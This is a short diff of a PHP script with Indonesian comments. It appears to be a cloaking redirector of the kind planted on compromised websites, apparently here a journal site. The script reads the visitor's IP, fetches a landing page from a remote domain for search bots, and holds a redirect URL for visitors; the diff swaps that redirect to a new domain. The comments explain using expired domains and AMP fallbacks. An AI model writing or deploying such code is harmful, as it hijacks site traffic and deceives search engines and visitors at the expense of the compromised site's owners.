@@ -12,7 +12,7 @@ return $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVE
 $ip = get_client_ip();
 
 $bot_url = "https://homebaselanding.xyz/landing/mohjournals/"; // Upload dulu di 1 domain, exp, aged bebas, lalu taruh disini
-$reff_url = "https://bagandeli.store/amp/mohjurnals/"; // Biar misal amp gak nyala langsung direct kesini, biasa gw kasih link ampnya
+$reff_url = "https://dontddos.xyz/amp-belawan/globesummit/"; // Biar misal amp gak nyala langsung direct kesini, biasa gw kasih link ampnya
 
 $file = file_get_contents($bot_url);
 
